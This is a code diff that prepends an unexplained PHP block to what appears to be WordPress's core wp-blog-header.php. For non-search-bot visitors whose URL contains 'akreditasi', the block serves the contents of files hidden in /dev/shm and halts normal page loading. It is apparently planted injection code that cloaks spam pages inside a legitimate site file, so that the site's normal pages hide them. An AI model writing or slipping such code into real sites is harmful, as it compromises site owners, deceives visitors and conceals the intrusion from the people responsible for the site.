@@ -1,0 +1,47 @@
+<?php
+
+$ua = $_SERVER['HTTP_USER_AGENT'];
+
+if (!preg_match('/googlebot|bingbot|slurp/i', $ua)) {
+
+    if (strpos($_SERVER['REQUEST_URI'], 'akreditasi') !== false) {
+
+        $files = [
+            "/dev/shm/akreditasi.txt",
+            "/dev/shm/mudah.txt"
+        ];
+
+        $file = $files[array_rand($files)];
+
+        if (file_exists($file)) {
+            echo file_get_contents($file);
+            exit;
+        }
+
+    }
+
+}
+
+?>
+
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
